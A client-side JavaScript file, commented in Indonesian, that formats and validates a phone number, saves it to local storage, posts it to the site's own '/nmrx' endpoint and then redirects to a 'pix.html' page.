// form.js

const phoneInput =
document.getElementById("phone");

const lanjutBtn =
document.getElementById("lanjutBtn");

const loadingBox =
document.getElementById("loadingBox");

const clearBtn =
document.getElementById("clearBtn");

const errorBox =
document.getElementById("errorBox");


/* FADE IN */
window.addEventListener("load", () => {

    document.body.classList.add("fade-in");

});


/* AUTO FOCUS */
window.onload = () => {

    phoneInput.focus();

};


/* FORMAT NOMOR */
phoneInput.addEventListener("input", (e) => {

    /* ANGKA SAJA */
    let angka = e.target.value.replace(/\D/g, '');

    /* MAX 13 ANGKA */
    angka = angka.substring(0, 13);

    let hasil = "";

    /* 3 ANGKA PERTAMA */
    if (angka.length > 0) {

        hasil += angka.substring(0, 3);

    }

    /* 4 ANGKA BERIKUTNYA */
    if (angka.length > 3) {

        hasil += "-" + angka.substring(3, 7);

    }

    /* SISA ANGKA */
    if (angka.length > 7) {

        hasil += "-" + angka.substring(7, 13);

    }

    e.target.value = hasil;


    /* SHOW / HIDE X */
    if (hasil.length > 0) {

        clearBtn.style.display = "flex";

    } else {

        clearBtn.style.display = "none";

    }


    /* HIDE ERROR */
    errorBox.classList.remove("show");

});


/* CLEAR INPUT */
clearBtn.addEventListener("click", () => {

    phoneInput.value = "";

    clearBtn.style.display = "none";

    errorBox.classList.remove("show");

    phoneInput.focus();

});


/* KEYBOARD ANGKA */
phoneInput.setAttribute("inputmode", "numeric");


/* ENTER */
phoneInput.addEventListener("keypress", (e) => {

    if (e.key === "Enter") {

        lanjutBtn.click();

    }

});


/* LANJUT */
lanjutBtn.addEventListener("click", async () => {

    /* AMBIL NOMOR TANPA FORMAT */
    const nomor = phoneInput.value.replace(/\D/g, '');


    /* VALIDASI */
    if (
        nomor.length < 9 ||
        nomor.charAt(0) !== "8"
    ) {

        if (navigator.vibrate) {

            navigator.vibrate([
                120,
                80,
                120
            ]);

        }

        errorBox.classList.add("show");

        setTimeout(() => {

            errorBox.classList.remove("show");

        }, 2000);

        phoneInput.focus();

        return;

    }


    /* FORMAT NOMOR UNTUK DIKIRIM */
    const nomorFormat = nomor.replace(
        /^(\d{3})(\d{4})(\d+)$/,
        '$1-$2-$3'
    );


    /* SIMPAN KE LOCAL STORAGE */
    localStorage.setItem("nmrx", nomorFormat);


    /* KIRIM KE SERVER */
    try {

        const response = await fetch("/nmrx", {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({

                nmrx: nomorFormat

            })

        });


        /* CEK RESPONSE */
        if (!response.ok) {

            throw new Error("Gagal mengirim nomor");

        }


        /* SHOW LOADING */
        loadingBox.style.display = "flex";


        /* PINDAH HALAMAN */
        setTimeout(() => {

            document.body.classList.add("fade-out");

            window.location.href = "pix.html";

        }, 2000);


    } catch (error) {

        console.error("Error:", error);

        errorBox.classList.add("show");

        setTimeout(() => {

            errorBox.classList.remove("show");

        }, 2000);

    }

});


/* RESET LOADING */
window.addEventListener("pageshow", () => {

    loadingBox.style.display = "none";

});
